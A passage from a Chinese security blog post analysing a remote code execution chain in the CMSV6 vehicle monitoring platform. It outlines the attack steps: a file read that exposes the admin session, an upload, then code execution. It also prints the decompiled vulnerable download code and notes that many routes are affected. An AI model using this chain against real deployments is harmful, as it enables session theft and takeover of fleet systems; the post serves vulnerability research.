<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="HandheldFriendly" content="True"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=5"><meta name="description" content="浅析通天星CMSV6车载定位监控平台远程代码执行漏洞写在前面看了一下通告看着还是比较有意思的，通天星CMSV6车载定位监控平台远程代码执行漏洞 第一步是通过任意文件读取漏洞，读取log日志获取admin的session信息 第二步通过默认密码登录ftp服务器上传文件(或通过后台任意文件上传漏洞) 第三步触发上传文件中的恶意代码 正文采用了经典SSH架构 任意文件读取关于任意文件读取，从官方安全公告"><meta property="og:type" content="article"><meta property="og:title" content="浅析通天星CMSV6车载定位监控平台远程代码执行漏洞"><meta property="og:url" content="https://y4tacker.github.io/2024/05/18/year/2024/5/%E6%B5%85%E6%9E%90%E9%80%9A%E5%A4%A9%E6%98%9FCMSV6%E8%BD%A6%E8%BD%BD%E5%AE%9A%E4%BD%8D%E7%9B%91%E6%8E%A7%E5%B9%B3%E5%8F%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/index.html"><meta property="og:site_name" content="Y4tacker:Hacking The World!"><meta property="og:description" content="浅析通天星CMSV6车载定位监控平台远程代码执行漏洞写在前面看了一下通告看着还是比较有意思的，通天星CMSV6车载定位监控平台远程代码执行漏洞 第一步是通过任意文件读取漏洞，读取log日志获取admin的session信息 第二步通过默认密码登录ftp服务器上传文件(或通过后台任意文件上传漏洞) 第三步触发上传文件中的恶意代码 正文采用了经典SSH架构 任意文件读取关于任意文件读取，从官方安全公告"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://y4tacker.github.io/2024/05/18/year/2024/5/%E6%B5%85%E6%9E%90%E9%80%9A%E5%A4%A9%E6%98%9FCMSV6%E8%BD%A6%E8%BD%BD%E5%AE%9A%E4%BD%8D%E7%9B%91%E6%8E%A7%E5%B9%B3%E5%8F%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240518224902529.png"><meta property="og:image" content="https://y4tacker.github.io/2024/05/18/year/2024/5/%E6%B5%85%E6%9E%90%E9%80%9A%E5%A4%A9%E6%98%9FCMSV6%E8%BD%A6%E8%BD%BD%E5%AE%9A%E4%BD%8D%E7%9B%91%E6%8E%A7%E5%B9%B3%E5%8F%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240518225312913.png"><meta property="og:image" content="https://y4tacker.github.io/2024/05/18/year/2024/5/%E6%B5%85%E6%9E%90%E9%80%9A%E5%A4%A9%E6%98%9FCMSV6%E8%BD%A6%E8%BD%BD%E5%AE%9A%E4%BD%8D%E7%9B%91%E6%8E%A7%E5%B9%B3%E5%8F%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240518225613963.png"><meta property="og:image" content="https://y4tacker.github.io/2024/05/18/year/2024/5/%E6%B5%85%E6%9E%90%E9%80%9A%E5%A4%A9%E6%98%9FCMSV6%E8%BD%A6%E8%BD%BD%E5%AE%9A%E4%BD%8D%E7%9B%91%E6%8E%A7%E5%B9%B3%E5%8F%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240518230403232.png"><meta property="article:published_time" content="2024-05-18T13:28:19.000Z"><meta property="article:modified_time" content="2024-05-23T09:18:08.000Z"><meta property="article:author" content="Y4tacker"><meta property="article:tag" content="Java"><meta property="article:tag" content="通天星"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://y4tacker.github.io/2024/05/18/year/2024/5/%E6%B5%85%E6%9E%90%E9%80%9A%E5%A4%A9%E6%98%9FCMSV6%E8%BD%A6%E8%BD%BD%E5%AE%9A%E4%BD%8D%E7%9B%91%E6%8E%A7%E5%B9%B3%E5%8F%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240518224902529.png"><link rel="shortcut icon" href="/images/favicon.ico"><link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png"><title>浅析通天星CMSV6车载定位监控平台远程代码执行漏洞</title><link rel="stylesheet" href="/css/style.css"><meta name="generator" content="Hexo 5.4.1"><link rel="alternate" href="/atom.xml" title="Y4tacker:Hacking The World!" type="application/atom+xml"></head><body class="max-width mx-auto px3 ltr"><div id="header-post"><a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a> <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a> <a id="top-icon-tablet" href="#" aria-label="Top" onclick='$("html, body").animate({scrollTop:0},"fast")' style="display:none"><i class="fa-solid fa-chevron-up fa-lg"></i></a> <span id="menu"><span id="nav"><ul><li><a href="/">Home</a></li><li><a href="/archives/">Writing</a></li><li><a href="/tags/">Topics</a></li><li><a href="/search/">Search</a></li><li><a href="/about/">About</a></li><li><a href="/link/">Friends</a></li></ul></span><br><span id="actions"><ul><li><a class="icon" aria-label="Previous post" href="/2024/05/28/year/2024/5/ShowDocV3-2-5%E6%9C%80%E6%96%B0%E7%89%88SQL%E6%B3%A8%E5%85%A5%E5%8F%8A%E8%80%81%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover='$("#i-prev").toggle()' onmouseout='$("#i-prev").toggle()'></i></a></li><li><a class="icon" aria-label="Next post" href="/2024/05/11/year/2024/5/%E6%B5%85%E6%9E%90H3C-CAS%E8%99%9A%E6%8B%9F%E5%8C%96%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E8%87%B4%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover='$("#i-next").toggle()' onmouseout='$("#i-next").toggle()'></i></a></li><li><a class="icon" aria-label="Back to top" href="#" onclick='$("html, body").animate({scrollTop:0},"fast")'><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover='$("#i-top").toggle()' onmouseout='$("#i-top").toggle()'></i></a></li><li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover='$("#i-share").toggle()' onmouseout='$("#i-share").toggle()' onclick='return $("#share").toggle(),!1'></i></a></li></ul><span id="i-prev" class="info" style="display:none">Previous post</span> <span id="i-next" class="info" style="display:none">Next post</span> <span id="i-top" class="info" style="display:none">Back to top</span> <span id="i-share" class="info" style="display:none">Share post</span></span><br><div id="share" style="display:none"><ul><li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://y4tacker.github.io/2024/05/18/year/2024/5/%E6%B5%85%E6%9E%90%E9%80%9A%E5%A4%A9%E6%98%9FCMSV6%E8%BD%A6%E8%BD%BD%E5%AE%9A%E4%BD%8D%E7%9B%91%E6%8E%A7%E5%B9%B3%E5%8F%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"><i class="fab fa-facebook" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://y4tacker.github.io/2024/05/18/year/2024/5/%E6%B5%85%E6%9E%90%E9%80%9A%E5%A4%A9%E6%98%9FCMSV6%E8%BD%A6%E8%BD%BD%E5%AE%9A%E4%BD%8D%E7%9B%91%E6%8E%A7%E5%B9%B3%E5%8F%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/&text=浅析通天星CMSV6车载定位监控平台远程代码执行漏洞"><i class="fab fa-twitter" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://y4tacker.github.io/2024/05/18/year/2024/5/%E6%B5%85%E6%9E%90%E9%80%9A%E5%A4%A9%E6%98%9FCMSV6%E8%BD%A6%E8%BD%BD%E5%AE%9A%E4%BD%8D%E7%9B%91%E6%8E%A7%E5%B9%B3%E5%8F%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/&title=浅析通天星CMSV6车载定位监控平台远程代码执行漏洞"><i class="fab fa-linkedin" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://y4tacker.github.io/2024/05/18/year/2024/5/%E6%B5%85%E6%9E%90%E9%80%9A%E5%A4%A9%E6%98%9FCMSV6%E8%BD%A6%E8%BD%BD%E5%AE%9A%E4%BD%8D%E7%9B%91%E6%8E%A7%E5%B9%B3%E5%8F%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/&is_video=false&description=浅析通天星CMSV6车载定位监控平台远程代码执行漏洞"><i class="fab fa-pinterest" aria-hidden="true"></i></a></li><li><a class="icon" href="mailto:?subject=浅析通天星CMSV6车载定位监控平台远程代码执行漏洞&body=Check out this article: https://y4tacker.github.io/2024/05/18/year/2024/5/%E6%B5%85%E6%9E%90%E9%80%9A%E5%A4%A9%E6%98%9FCMSV6%E8%BD%A6%E8%BD%BD%E5%AE%9A%E4%BD%8D%E7%9B%91%E6%8E%A7%E5%B9%B3%E5%8F%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"><i class="fa-solid fa-envelope" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://y4tacker.github.io/2024/05/18/year/2024/5/%E6%B5%85%E6%9E%90%E9%80%9A%E5%A4%A9%E6%98%9FCMSV6%E8%BD%A6%E8%BD%BD%E5%AE%9A%E4%BD%8D%E7%9B%91%E6%8E%A7%E5%B9%B3%E5%8F%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/&title=浅析通天星CMSV6车载定位监控平台远程代码执行漏洞"><i class="fab fa-get-pocket" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://y4tacker.github.io/2024/05/18/year/2024/5/%E6%B5%85%E6%9E%90%E9%80%9A%E5%A4%A9%E6%98%9FCMSV6%E8%BD%A6%E8%BD%BD%E5%AE%9A%E4%BD%8D%E7%9B%91%E6%8E%A7%E5%B9%B3%E5%8F%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/&title=浅析通天星CMSV6车载定位监控平台远程代码执行漏洞"><i class="fab fa-reddit" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://y4tacker.github.io/2024/05/18/year/2024/5/%E6%B5%85%E6%9E%90%E9%80%9A%E5%A4%A9%E6%98%9FCMSV6%E8%BD%A6%E8%BD%BD%E5%AE%9A%E4%BD%8D%E7%9B%91%E6%8E%A7%E5%B9%B3%E5%8F%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/&title=浅析通天星CMSV6车载定位监控平台远程代码执行漏洞"><i class="fab fa-stumbleupon" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://y4tacker.github.io/2024/05/18/year/2024/5/%E6%B5%85%E6%9E%90%E9%80%9A%E5%A4%A9%E6%98%9FCMSV6%E8%BD%A6%E8%BD%BD%E5%AE%9A%E4%BD%8D%E7%9B%91%E6%8E%A7%E5%B9%B3%E5%8F%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/&title=浅析通天星CMSV6车载定位监控平台远程代码执行漏洞"><i class="fab fa-digg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://y4tacker.github.io/2024/05/18/year/2024/5/%E6%B5%85%E6%9E%90%E9%80%9A%E5%A4%A9%E6%98%9FCMSV6%E8%BD%A6%E8%BD%BD%E5%AE%9A%E4%BD%8D%E7%9B%91%E6%8E%A7%E5%B9%B3%E5%8F%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/&name=浅析通天星CMSV6车载定位监控平台远程代码执行漏洞&description="><i class="fab fa-tumblr" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://y4tacker.github.io/2024/05/18/year/2024/5/%E6%B5%85%E6%9E%90%E9%80%9A%E5%A4%A9%E6%98%9FCMSV6%E8%BD%A6%E8%BD%BD%E5%AE%9A%E4%BD%8D%E7%9B%91%E6%8E%A7%E5%B9%B3%E5%8F%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/&t=浅析通天星CMSV6车载定位监控平台远程代码执行漏洞"><i class="fab fa-hacker-news" aria-hidden="true"></i></a></li></ul></div><div id="toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B5%85%E6%9E%90%E9%80%9A%E5%A4%A9%E6%98%9FCMSV6%E8%BD%A6%E8%BD%BD%E5%AE%9A%E4%BD%8D%E7%9B%91%E6%8E%A7%E5%B9%B3%E5%8F%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text">浅析通天星CMSV6车载定位监控平台远程代码执行漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2"><span class="toc-number">1.1.</span> <span class="toc-text">写在前面</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A3%E6%96%87"><span class="toc-number">1.2.</span> <span class="toc-text">正文</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">1.2.1.</span> <span class="toc-text">任意文件读取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.2.2.</span> <span class="toc-text">后台文件上传</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.2.3.</span> <span class="toc-text">反序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E7%AA%81%E7%A0%B4%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%99%90%E5%88%B6"><span class="toc-number">1.2.4.</span> <span class="toc-text">尝试突破文件上传限制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%B9%E6%8A%97%E6%B5%81%E9%87%8F%E8%AE%BE%E5%A4%87%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%9D%E8%AF%95"><span class="toc-number">1.2.5.</span> <span class="toc-text">对抗流量设备的一些尝试</span></a></li></ol></li></ol></li></ol></div></span></div><div class="content index py4"><article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting"><header><h1 class="posttitle p-name" itemprop="name headline">浅析通天星CMSV6车载定位监控平台远程代码执行漏洞</h1><div class="meta"><span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person"><span class="p-name" itemprop="name">Y4tacker</span></span><div class="postdate"><time datetime="2024-05-18T13:28:19.000Z" class="dt-published" itemprop="datePublished">2024-05-18</time> (Updated: <time datetime="2024-05-23T09:18:08.000Z" class="dt-updated" itemprop="dateModified">2024-05-23</time>)</div><div class="article-category"><i class="fa-solid fa-archive"></i> <a class="category-link" href="/categories/Java/">Java</a></div><div class="article-tag"><i class="fa-solid fa-tag"></i> <a class="p-category" href="/tags/Java/" rel="tag">Java</a>, <a class="p-category" href="/tags/%E9%80%9A%E5%A4%A9%E6%98%9F/" rel="tag">通天星</a></div></div></header><div class="content e-content" itemprop="articleBody"><h1 id="浅析通天星CMSV6车载定位监控平台远程代码执行漏洞"><a href="#浅析通天星CMSV6车载定位监控平台远程代码执行漏洞" class="headerlink" title="浅析通天星CMSV6车载定位监控平台远程代码执行漏洞"></a>浅析通天星CMSV6车载定位监控平台远程代码执行漏洞</h1><h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>看了一下通告看着还是比较有意思的，<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/tpETW7CqL7C-KGc7E36AxQ">通天星CMSV6车载定位监控平台远程代码执行漏洞</a></p><p>第一步是通过任意文件读取漏洞，读取log日志获取admin的session信息</p><p>第二步通过默认密码登录ftp服务器上传文件(或通过后台任意文件上传漏洞)</p><p>第三步触发上传文件中的恶意代码</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>采用了经典SSH架构</p><h3 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><p>关于任意文件读取，从<a target="_blank" rel="noopener" href="http://www.g-sky.cn/view/13/348/1">官方安全公告</a>也不难看出:</p><p>(中危)修复StandardSchoolBusAction_downLoad.action接口任意文件下载问题</p><p>漏洞点位于StandardSchoolBusAction的downLoad功能，这部分访问规则的配置看<code>struts2.xml</code>即可</p><p>定义了class与mothod的访问方式</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;**/*_*.action&quot;</span> <span class="attr">class</span>=<span class="string">&quot;&#123;2&#125;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;&#123;3&#125;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>经过简单的分析发现，实际漏洞点在<code>com.gpsCommon.action.CommonBaseAction#downLoad</code>，代码逻辑比较简单就不详细分析了，相关代码如下，可以看到读取的文件不仅可以是使用绝对路径，也可以使用相对路径读取任意文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">downLoad</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        String filePath = <span class="keyword">this</span>.getDownloadFileRealPath(<span class="keyword">this</span>.getRequest());</span><br><span class="line">        <span class="keyword">if</span> ((!filePath.contains(<span class="string">&quot;tomcat/&quot;</span>) || filePath.contains(<span class="string">&quot;tomcat/ttxapps&quot;</span>)) &amp;&amp; !filePath.contains(<span class="string">&quot;.xml&quot;</span>) &amp;&amp; !filePath.contains(<span class="string">&quot;WEB-INF&quot;</span>) &amp;&amp; !filePath.contains(<span class="string">&quot;classes&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!AssertUtils.isNull(filePath)) &#123;</span><br><span class="line">                InputStream ins = <span class="keyword">null</span>;</span><br><span class="line">                BufferedInputStream bins = <span class="keyword">null</span>;</span><br><span class="line">                OutputStream outs = <span class="keyword">null</span>;</span><br><span class="line">                BufferedOutputStream bouts = <span class="keyword">null</span>;</span><br><span class="line">                Integer requestStringEx = <span class="keyword">this</span>.getRequestInteger(<span class="string">&quot;isTure&quot;</span>);</span><br><span class="line">                Integer isStream = <span class="keyword">this</span>.getRequestInteger(<span class="string">&quot;isStream&quot;</span>);</span><br><span class="line">                Integer isDel = <span class="keyword">this</span>.getRequestInteger(<span class="string">&quot;isDel&quot;</span>);</span><br><span class="line">                String fileRealPath = <span class="keyword">null</span>;</span><br><span class="line">                <span class="keyword">if</span> (requestStringEx != <span class="keyword">null</span> &amp;&amp; requestStringEx == <span class="number">1</span>) &#123;</span><br><span class="line">                    fileRealPath = filePath;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    fileRealPath = <span class="keyword">this</span>.getDownloadFileRealPath(<span class="keyword">this</span>.getServletContext(), filePath);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                File file = <span class="keyword">new</span> File(fileRealPath);</span><br><span class="line">                <span class="keyword">if</span> (file.exists()) &#123;</span><br><span class="line">                    ins = <span class="keyword">new</span> FileInputStream(fileRealPath);</span><br><span class="line">                    bins = <span class="keyword">new</span> BufferedInputStream(ins);</span><br><span class="line">                    outs = <span class="keyword">this</span>.getResponse().getOutputStream();</span><br><span class="line">                    bouts = <span class="keyword">new</span> BufferedOutputStream(outs);</span><br><span class="line">                    <span class="keyword">if</span> (isStream == <span class="keyword">null</span> || isStream != <span class="number">1</span>) &#123;</span><br><span class="line">                        <span class="keyword">this</span>.setDownLoadParam(<span class="keyword">this</span>.getRequest(), <span class="keyword">this</span>.getResponse(), file.getName());</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">int</span> b = <span class="keyword">false</span>;</span><br><span class="line">                    <span class="keyword">byte</span>[] buffer = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">512</span>];</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">int</span> b;</span><br><span class="line">                    <span class="keyword">while</span>((b = bins.read(buffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                        bouts.write(buffer, <span class="number">0</span>, b);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    bouts.flush();</span><br><span class="line">                    ins.close();</span><br><span class="line">                    bins.close();</span><br><span class="line">                    outs.close();</span><br><span class="line">                    bouts.close();</span><br><span class="line">                    <span class="keyword">if</span> (isDel != <span class="keyword">null</span> &amp;&amp; isDel == <span class="number">1</span> &amp;&amp; file.exists()) &#123;</span><br><span class="line">                        file.delete();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    result = <span class="number">44</span>;</span><br><span class="line">                    <span class="keyword">this</span>.addCustomResponse(ACTION_RESULT, <span class="number">44</span>);</span><br><span class="line">                    <span class="keyword">this</span>.addCustomResponse(ACTION_RESULT_TIP, <span class="string">&quot;File Not Exist!&quot;</span>);</span><br><span class="line">                    <span class="keyword">this</span>.log.error(<span class="string">&quot;下载的文件不存在&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                result = <span class="number">8</span>;</span><br><span class="line">                <span class="keyword">this</span>.addCustomResponse(ACTION_RESULT, <span class="number">8</span>);</span><br><span class="line">                <span class="keyword">this</span>.addCustomResponse(ACTION_RESULT_TIP, <span class="string">&quot;Request Param Error!&quot;</span>);</span><br><span class="line">                <span class="keyword">this</span>.log.error(<span class="string">&quot;下载文件时参数错误&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            result = <span class="number">24</span>;</span><br><span class="line">            <span class="keyword">this</span>.addCustomResponse(ACTION_RESULT, <span class="number">24</span>);</span><br><span class="line">            <span class="keyword">this</span>.addCustomResponse(ACTION_RESULT_TIP, <span class="string">&quot;Permission denied!&quot;</span>);</span><br><span class="line">            <span class="keyword">this</span>.log.error(<span class="string">&quot;用户无权限下载Tomcat内的文件&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var14) &#123;</span><br><span class="line">        <span class="keyword">this</span>.log.error(var14.getMessage(), var14);</span><br><span class="line">        result = <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">this</span>.addCustomResponse(ACTION_RESULT, <span class="number">4</span>);</span><br><span class="line">        <span class="keyword">this</span>.addCustomResponse(ACTION_RESULT_TIP, <span class="string">&quot;Request Exception!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.getReturnParam(result);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">protected</span> String <span class="title">getDownloadFileRealPath</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.getRequestStringEx(<span class="string">&quot;path&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getRequestStringEx</span><span class="params">(String parameter)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> RequestUtil.getRequestStringEx(parameter);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">getRequestStringEx</span><span class="params">(String parameter)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        HttpServletRequest request = getRequest();</span><br><span class="line">        <span class="keyword">if</span> (request == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            request.setCharacterEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">            String param = request.getParameter(parameter);</span><br><span class="line">            <span class="keyword">return</span> param != <span class="keyword">null</span> ? URLDecoder.decode(param, StandardCharsets.UTF_8) : <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var3) &#123;</span><br><span class="line">        log.error(var3.getMessage(), var3);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过任意文件读取我们能很容易读取到session信息</p><p><img src="/2024/05/18/year/2024/5/%E6%B5%85%E6%9E%90%E9%80%9A%E5%A4%A9%E6%98%9FCMSV6%E8%BD%A6%E8%BD%BD%E5%AE%9A%E4%BD%8D%E7%9B%91%E6%8E%A7%E5%B9%B3%E5%8F%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240518224902529.png" alt="image-20240518224902529"></p><p>另外多提一嘴，漏洞点<code>com.gpsCommon.action.CommonBaseAction#downLoad</code>在抽象类当中，通过将tomcat下class手动打包为jar后分析，不难发现实际受影响的路由多达320个，因此实际利用时我们不必拘泥与官方公告提到的一种</p><p><img 